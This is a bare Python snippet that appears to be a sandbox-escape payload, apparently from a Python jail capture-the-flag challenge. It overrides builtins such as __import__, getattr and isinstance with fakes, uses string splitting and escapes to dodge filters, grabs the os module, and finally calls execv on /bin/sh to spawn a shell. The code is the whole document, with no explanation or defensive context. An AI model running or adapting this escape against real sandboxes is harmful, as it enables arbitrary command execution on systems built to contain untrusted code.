def fake_tuple(*a):
    return a

def fake_getattr(obj, name, default=None):
    global _os
    if name == '__spec__':        
        return builtins_mod
    elif name == '__path__':
        _os = obj
    
    return default

def fake_isinstance(obj, class_or_tuple):
    class_or_tuple('os\x2eq',*'gg')

def fake_im_port(name, globals, locals, fromlist, level):
    global builtins_mod, __builtins__
    builtins_mod = globals['__builtins__']
    "%r" % builtins_mod
    
    __builtins__ = _os
    (lambda: execv("/bin/sh", ["sh"]))()

set_builtin("name", "goon")
set_builtin("origin", None)
set_builtin("loader", "gg")

set_builtin("__im""port__", fake_im_port)
set_builtin("getattr", fake_getattr)
set_builtin("tuple", fake_tuple)
set_builtin("isinstance", fake_isinstance)
gg